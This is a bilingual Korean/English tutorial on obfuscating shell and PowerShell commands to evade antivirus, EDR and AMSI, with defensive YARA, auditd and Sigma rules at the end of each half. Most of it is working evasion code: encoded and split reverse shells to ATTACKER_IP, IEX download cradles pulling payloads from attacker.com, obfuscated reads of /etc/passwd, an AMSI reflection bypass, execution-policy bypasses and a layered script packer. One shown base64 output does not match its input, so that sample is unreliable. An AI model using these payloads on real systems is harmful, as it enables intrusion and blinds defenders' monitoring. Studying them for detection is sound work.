> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 셸 스크립트 난독화 및 탐지 우회

## 0. 초보자를 위한 개념 이해

### 난독화와 탐지 우회란?

난독화(Obfuscation)는 코드나 명령어를 원래 의미를 유지하면서도 읽기 어렵게 변형하는 기술이다. 보안 제품(안티바이러스, EDR)은 알려진 공격 패턴의 "서명(시그니처)"을 데이터베이스에 저장해 탐지한다. 공격자는 이 서명이 매칭되지 않도록 코드를 변형하고, 방어자는 이 변형 패턴을 이해하여 더 강력한 탐지 규칙을 만든다.

**왜 배우는가:**
```
탐지 우회 기법을 배워야 하는 이유

[공격자 관점]                  [방어자 관점]
시그니처 기반 탐지 우회  →  행위 기반 탐지 규칙 작성
AV/EDR 센서 비활성화    →  AMSI/ETW 무결성 모니터링
인코딩으로 페이로드 숨김 →  Base64/인코딩 자동 디코딩 탐지

방어를 잘 하려면 공격 방법을 알아야 한다 (알아야 막는다)
```

### 핵심 개념 정리

```
주요 탐지 레이어와 우회 방법

탐지 레이어          우회 기법
─────────────────────────────────────────
파일 시그니처 AV     Base64 인코딩, 변수 분할, 다형성 코드
AMSI (스크립트 검사) 메모리 패치, 반사(Reflection) 기법
ETW (이벤트 추적)    ETW 비활성화 패치
EDR 행위 탐지        LOLBin 사용 (정상 시스템 도구 악용)
네트워크 IDS/IPS     암호화 통신(C2), DNS 터널링
```

### 필요한 도구 및 환경
- **Linux**: Bash 내장 도구만으로 대부분 실습 가능
- **Windows VM**: PowerShell 난독화 실습용 (테스트 환경 필수)
- **shellcheck**: 난독화 전후 문법 검증

### 기초 실습 예제
```bash
# Base64 인코딩/디코딩 기본 이해
PAYLOAD='echo "hello world"'

# 인코딩
ENCODED=$(echo "$PAYLOAD" | base64)
echo "인코딩: $ENCODED"

# 디코딩 후 실행 (탐지 우회 원리)
echo "$ENCODED" | base64 -d | bash

# 변수 분할 난독화 원리 (nc 탐지 우회 예시)
# 원본: nc -e /bin/bash 127.0.0.1 4444
a="n"; b="c"
# ${a}${b} 로 조합하면 'nc' 문자열이 스크립트에 직접 등장 안 함
echo "조합 결과: ${a}${b}"
```

---

## 개요

안티바이러스, EDR(Endpoint Detection and Response), SIEM 등이 탐지하는 시그니처를 우회하기 위해 다양한 난독화 기법이 사용된다. 방어자 입장에서도 이 기법들을 이해해야 효과적인 탐지 규칙을 만들 수 있다.

---

## Bash 난독화 기법

### 기법 1: 변수를 이용한 문자열 분할

```bash
# 원본 (탐지됨)
nc -e /bin/bash ATTACKER_IP 4444

# 난독화: 변수 분할
a="n"; b="c"; c=" -e /bin/bash "
d="ATTACKER_IP"; e=" 4444"
${a}${b}${c}${d}${e}

# 배열로 분할
cmd=(n c ' ' - e ' ' / b i n / b a s h ' ' A T T A C K E R _ I P ' ' 4 4 4 4)
"${cmd[@]}"
```

### 기법 2: Base64 인코딩

```bash
# 페이로드 인코딩
PAYLOAD='nc -e /bin/bash ATTACKER_IP 4444'
ENCODED=$(echo "$PAYLOAD" | base64)
echo $ENCODED
# bXBxdHBlIHVlIC1lIC9iaW4vYmFzaCBBVFRBQ0tFUl9JUCA0NDQ0Cg==

# 실행
echo $ENCODED | base64 -d | bash

# 다중 레이어
echo $ENCODED | base64 -d | base64 -d | bash

# 원라이너
bash -c "$(echo 'bmMgLWUgL2Jpbi9iYXNoIEFUVEFDS0VSX0lQIDQ0NDQK' | base64 -d)"
```

### 기법 3: hex 인코딩

```bash
# 문자를 hex로 변환
STRING="whoami"
HEX=$(echo -n "$STRING" | xxd -p | tr -d '\n')
echo $HEX  # 77686f616d69

# hex를 명령어로 실행
$(echo -e "\x77\x68\x6f\x61\x6d\x69")

# Python으로 변환 자동화
python3 -c "print(''.join(f'\\\\x{c:02x}' for c in b'whoami'))"
```

### 기법 4: IFS(Internal Field Separator) 조작

```bash
# 기본 IFS는 공백/탭/개행
# IFS를 문자로 설정하면 해당 문자가 구분자 역할

IFS=_
cmd=nc_-e_/bin/bash_ATTACKER_IP_4444
$cmd

# 또는 특수문자로 분할
IFS='@'
c='nc@-e@/bin/bash@ATTACKER_IP@4444'
$c
```

### 기법 5: eval과 간접 참조

```bash
# eval 체인
cmd1='eva'
cmd2='l'
${cmd1}${cmd2} "whoami"

# $() 중첩
$($(echo "echo") "whoami" | $(echo "bash"))

# 프로세스 치환
bash <(echo 'whoami')
bash <(base64 -d <<< 'd2hvYW1pCg==')
```

### 기법 6: 환경변수 활용

```bash
# PATH 조작으로 명령어 위치 숨기기
export PATH=/tmp:$PATH
cp /bin/bash /tmp/ls
ls  # 실제로는 bash 실행됨

# 환경변수에 명령 저장
export X='bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
eval $X

# IFS를 이용한 환경변수 분리
X="whoami"
${!X}  # 변수의 값을 변수명으로 사용
```

---

## PowerShell 난독화

### 기법 1: 대소문자 혼합 (PowerShell 대소문자 무감)

```powershell
# 원본
Invoke-Expression "whoami"

# 대소문자 혼합 (탐지 우회)
InVoKe-ExPrEsSiOn "whoami"
iEx "whoami"
```

### 기법 2: 백틱(`) 삽입

```powershell
# PowerShell에서 백틱은 이스케이프 문자
# 문자 사이에 삽입해도 같은 의미

i`E`x "who`ami"
In`vo`ke-Ex`pr`es`sion "who`ami"
```

### 기법 3: 문자열 조합

```powershell
# 문자 분할 후 합치기
$a = "Inv"; $b = "oke-"; $c = "Expression"
& ($a + $b + $c) "whoami"

# char 배열에서 조합
$cmd = [char]73 + [char]110 + [char]118 + [char]111 + [char]107 + [char]101
# = "Invoke"

# -join 연산자
$s = "w","h","o","a","m","i" -join ""
Invoke-Expression $s
```

### 기법 4: Base64 인코딩 (PowerShell 내장)

```powershell
# 명령을 Base64로 인코딩 (UTF-16LE 필수)
$cmd = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded

# 실행
powershell -EncodedCommand $encoded

# 원라이너 생성
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```

---

## AMSI(Anti-Malware Scan Interface) 우회

AMSI는 스크립트 실행 전 메모리 내용을 AV 엔진에 전달한다.

### 개념: amsiInitFailed 설정

```powershell
# amsi.dll의 AmsiScanBuffer 함수 패치 (교육 목적)
# 실제 코드는 다양한 탐지 우회 기법으로 난독화됨

# 원리: amsiContext 구조체의 amsiInitFailed를 True로 설정
# PowerShell이 AMSI 초기화 실패로 인식하여 스캔 스킵

$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### PowerShell 실행 정책 우회

```powershell
# 정책 우회 방법들 (환경마다 효과 다름)

# 방법 1: -ExecutionPolicy 플래그
powershell -ExecutionPolicy Bypass -File script.ps1

# 방법 2: 파이프로 전달
Get-Content script.ps1 | PowerShell.exe -NoProfile -

# 방법 3: 인코딩
powershell -EncodedCommand BASE64_CMD

# 방법 4: 환경변수
$env:PSExecutionPolicyPreference = "bypass"
```

---

## VM/샌드박스 감지

악성코드가 분석 환경을 감지하는 기법 (방어자가 탐지 기준으로 활용):

```python
#!/usr/bin/env python3
"""샌드박스 환경 탐지 지표 확인 (방어 목적 분석)"""

import os
import platform
import subprocess
import sys
import time


def check_vm_artifacts() -> list[str]:
    indicators: list[str] = []

    # 가상화 관련 프로세스
    vm_processes = {"vmtoolsd", "vmwaretray", "vboxservice", "sandboxie"}
    try:
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        running = result.stdout.lower()
        for proc in vm_processes:
            if proc in running:
                indicators.append(f"VM 프로세스 탐지: {proc}")
    except Exception:
        pass

    # 가상화 디바이스 파일
    vm_devices = [
        "/dev/vmware",
        "/.vboxclient",
        "/proc/vz",
        "/proc/xen",
    ]
    for dev in vm_devices:
        if os.path.exists(dev):
            indicators.append(f"VM 디바이스: {dev}")

    # CPU 코어 수 (샌드박스는 보통 1-2개)
    cpu_count = os.cpu_count() or 0
    if cpu_count <= 2:
        indicators.append(f"CPU 코어 수 적음: {cpu_count}")

    # 메모리 크기 확인
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if "MemTotal" in line:
                    kb = int(line.split()[1])
                    if kb < 2 * 1024 * 1024:  # 2GB 미만
                        indicators.append(f"메모리 적음: {kb // 1024}MB")
    except Exception:
        pass

    # 타이밍 공격 (샌드박스는 CPUID 명령이 느림)
    # 실제 구현은 어셈블리 레벨 필요

    return indicators


def check_user_activity() -> list[str]:
    indicators: list[str] = []

    # 홈 디렉토리 파일 수 확인 (샌드박스는 보통 비어있음)
    home = os.path.expanduser("~")
    file_count = sum(1 for _ in os.scandir(home))
    if file_count < 5:
        indicators.append(f"홈 디렉토리 파일 적음: {file_count}개")

    # 브라우저 히스토리 확인
    browser_paths = [
        os.path.expanduser("~/.mozilla/firefox"),
        os.path.expanduser("~/.config/google-chrome"),
    ]
    has_browser = any(os.path.exists(p) for p in browser_paths)
    if not has_browser:
        indicators.append("브라우저 히스토리 없음")

    return indicators


if __name__ == "__main__":
    print("[*] 환경 분석 중...")
    vm_indicators = check_vm_artifacts()
    user_indicators = check_user_activity()

    all_indicators = vm_indicators + user_indicators
    if all_indicators:
        print("[!] 분석 환경 가능성:")
        for ind in all_indicators:
            print(f"  - {ind}")
    else:
        print("[+] 일반 환경으로 판단")
```

---

## Python 스크립트 패킹 도구

```python
#!/usr/bin/env python3
"""
Script Packer - Python 스크립트 난독화 (교육 목적)
사용법: python3 packer.py --input script.py --output packed.py --layers 3
"""

import argparse
import base64
import zlib
from pathlib import Path


def pack_layer(code: str) -> str:
    compressed = zlib.compress(code.encode())
    encoded = base64.b64encode(compressed).decode()
    return (
        f"import zlib, base64\n"
        f"exec(zlib.decompress(base64.b64decode('{encoded}')))\n"
    )


def pack_script(input_path: Path, output_path: Path, layers: int) -> None:
    code = input_path.read_text()

    print(f"[*] 원본 크기: {len(code)} bytes")

    for i in range(layers):
        code = pack_layer(code)
        print(f"[*] 레이어 {i+1} 적용: {len(code)} bytes")

    output_path.write_text(code)
    print(f"[+] 패킹 완료: {output_path}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Script Packer - 스크립트 난독화 (교육/연구 목적)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--input", type=Path, required=True, help="입력 스크립트")
    parser.add_argument("--output", type=Path, required=True, help="출력 파일")
    parser.add_argument("--layers", type=int, default=2, help="난독화 레이어 수 (기본: 2)")

    args = parser.parse_args()

    if not args.input.exists():
        print(f"[-] 파일 없음: {args.input}")
        raise SystemExit(1)

    pack_script(args.input, args.output, args.layers)


if __name__ == "__main__":
    main()
```

---

## 방어 측 탐지 방법

### YARA 규칙 작성

```yara
rule PowerShell_Base64_Encoded {
    meta:
        description = "Base64 인코딩된 PowerShell 명령 탐지"
    strings:
        $b64_flag = "-EncodedCommand" nocase
        $b64_flag2 = "-enc" nocase
        $iex = "Invoke-Expression" nocase
        $iex2 = "IEX" nocase
    condition:
        1 of them
}

rule Bash_Base64_Execution {
    meta:
        description = "Base64 디코딩 후 bash 실행 탐지"
    strings:
        $decode = "base64 -d" ascii
        $decode2 = "base64 --decode" ascii
        $exec = "| bash" ascii
        $exec2 = "| sh" ascii
    condition:
        any of ($decode*) and any of ($exec*)
}
```

### 로그 기반 탐지 (Auditd)

```bash
# /etc/audit/rules.d/obfuscation.rules
# base64 명령 실행 탐지
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/base64 -k base64_exec

# eval 사용 탐지 (bash -c 경유)
-a always,exit -F arch=b64 -S execve -F exe=/bin/bash \
  -F arg1=-c -k bash_eval

# xxd 사용
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/xxd -k xxd_exec
```

---

<!-- detect-validate-20 -->
## 난독화·우회 탐지와 방어 검증

난독화·우회는 *시그니처 회피·스캔 인터페이스 무력화·분석 회피*를 노린다(인코딩·AMSI 우회·VM 감지·패킹). 방어자는 **로깅이 난독화를 평문으로 드러내는가**와 **인코딩 페이로드 흔적이 잡히는가**를 검증해야 한다. 실습은 **소유·격리 환경**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| bash/PS 난독화 | 시그니처 회피 | 디오브퍼스케이션·행위탐지 | base64·eval·`-enc` 패턴 |
| AMSI 우회 | 스캔 인터페이스 무력화 | AMSI 로깅·EDR | AmsiScanBuffer 패치·리플렉션 |
| VM/샌드박스 감지 | 분석 회피 | 위장 환경·아티팩트 제거 | 환경 핑거프린트 쿼리 |
| 스크립트 패킹 | 정적 분석 회피 | 동적 추적·메모리 | 런타임 디코드·고엔트로피 |

### 방어 검증 (직접 확인)

```bash
# 1) 인코딩·난독화 셸/PS 페이로드 흔적 점검(소유 로그/스크립트)
grep -rEi 'base64 -d|FromBase64String|-enc |IEX\(|eval[[:space:]]*\$\(' /var/log /home 2>/dev/null
# 2) PowerShell 스크립트블록 로깅(4104)이 켜져 있는지 — 우회 가시성(소유 호스트)
#    Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20 | ? Id -eq 4104
echo "ScriptBlock(4104)/Module 로깅 활성 시 -enc·IEX 난독화도 평문으로 기록된다"
#    로깅이 꺼져 있으면 난독화 우회는 사실상 보이지 않는다
```

> 난독화 방어는 *우회가 보이는가*다 — "EDR 있다"와 "인코딩·AMSI 우회가 로그에 평문으로 남는다"는 다르다. 소유 호스트에서 스크립트블록 로깅·인코딩 흔적을 직접 확인한다([[55_Evasion_Techniques]], [[06_Malware_Analysis]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# Shell Script Obfuscation and Detection Evasion

## Overview

Various obfuscation techniques are used to bypass signatures detected by antivirus, EDR (Endpoint Detection and Response), SIEM, and other tools. Defenders must also understand these techniques to create effective detection rules.

---

## 1. Bash Obfuscation Techniques

```bash
# Technique 1: Variable insertion
c\a\t /etc/passwd
c${IFS}a${IFS}t /etc/passwd

# Technique 2: Quoting and escaping
'c'a't' /etc/passwd
"c""a""t" /etc/passwd

# Technique 3: Base64 encoding
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Technique 4: Hex encoding
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash

# Technique 5: Variable indirection
cmd="cat /etc/passwd"
eval "$cmd"
$SHELL -c "$cmd"

# Technique 6: Command substitution
$(printf "\x63\x61\x74") /etc/passwd

# Combined (harder to detect)
${IFS:0:1}e${IFS:0:1}v${IFS:0:1}a${IFS:0:1}l "${IFS:0:1}$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)"
```

---

## 2. PowerShell Obfuscation

```powershell
# Technique 1: Alias
iex (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Technique 2: Case variation
iEx (NeW-ObJeCt NeT.WeBcLiEnT).DoWnLoAdStRiNg('http://attacker.com/payload.ps1')

# Technique 3: String splitting
$a = 'Down'+'load'+'String'
$b = (New-Object Net.WebClient).$a('http://attacker.com/payload.ps1')
iex $b

# Technique 4: Base64 encoding
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/x.ps1')"))
powershell -EncodedCommand $enc

# Technique 5: Character array
-join('I','E','X') # = IEX
[char[]](73,69,88) -join '' # = IEX

# Technique 6: Environment variable
$env:ComSpec  # = C:\Windows\system32\cmd.exe
```

---

## 3. AV/EDR Evasion Techniques

```python
#!/usr/bin/env python3
"""AV evasion techniques demonstration (for educational purposes)"""

# Technique 1: XOR encoding
def xor_encode(payload: bytes, key: int = 0xAA) -> bytes:
    return bytes(b ^ key for b in payload)

# Technique 2: Delayed execution
import time

def time_delay_exec(payload_func, delay: int = 5):
    """Execute after delay to avoid sandbox detection"""
    time.sleep(delay)
    return payload_func()

# Technique 3: Environment checks (anti-sandbox)
import platform
import os

def is_real_system() -> bool:
    """Check if running on real system vs sandbox"""
    checks = [
        os.path.exists("/etc/passwd"),       # Unix system files exist
        platform.node() != "sandbox",         # Not "sandbox" hostname
        os.cpu_count() > 2,                   # More than 2 CPUs (real system)
    ]
    return all(checks)

# Technique 4: Process hollowing (concept - Windows)
# 1. Create suspended process
# 2. Unmap memory of target process
# 3. Write malicious payload
# 4. Resume process
```

---

## 4. Detection Rules for These Techniques

```bash
# SIEM/Sigma rules to detect obfuscation attempts

# Detect base64 in command line
# Sigma rule: powershell_base64_encoded_command.yml
# logsource: product: windows, category: process_creation
# detection:
#   CommandLine|contains:
#     - '-EncodedCommand'
#     - '-enc '
#     - 'FromBase64String'

# Detect hex encoding in bash
# Process audit rule
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/base64 -k base64_exec

# Detect eval usage (via bash -c)
-a always,exit -F arch=b64 -S execve -F exe=/bin/bash \
  -F arg1=-c -k bash_eval

# Detect xxd usage
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/xxd -k xxd_exec
```

<!-- detect-validate-20 -->
## Obfuscation/Evasion Detection and Defense Validation

Obfuscation/evasion targets *signature evasion, neutralizing the scan interface, and analysis avoidance* (encoding, AMSI bypass, VM detection, packing). Defenders must verify **whether logging surfaces obfuscation in cleartext** and **whether encoded-payload traces are caught**. Validate only in **owned/isolated environments**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| bash/PS obfuscation | Signature evasion | Deobfuscation, behavior detection | base64 / eval / `-enc` pattern |
| AMSI bypass | Neutralized scan interface | AMSI logging, EDR | AmsiScanBuffer patch / reflection |
| VM/sandbox detection | Analysis avoidance | Camouflaged env, artifact removal | Environment fingerprint queries |
| Script packing | Static-analysis evasion | Dynamic trace, memory | Runtime decode / high entropy |

### Defense validation (verify directly)

```bash
# 1) Check for encoded/obfuscated shell/PS payload traces (own logs/scripts)
grep -rEi 'base64 -d|FromBase64String|-enc |IEX\(|eval[[:space:]]*\$\(' /var/log /home 2>/dev/null
# 2) Confirm PowerShell ScriptBlock logging (4104) is enabled — evasion visibility (own host)
#    Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20 | ? Id -eq 4104
echo "With ScriptBlock(4104)/Module logging on, -enc/IEX obfuscation is recorded in cleartext"
#    If logging is off, obfuscation-based evasion is effectively invisible
```

> Obfuscation defense is *whether evasion is visible* -- "we have EDR" differs from "encoding/AMSI bypass leaves cleartext in logs". Confirm ScriptBlock logging and encoding traces directly on owned hosts ([[55_Evasion_Techniques]], [[06_Malware_Analysis]], [[13_SOC_Blue_Team]]).
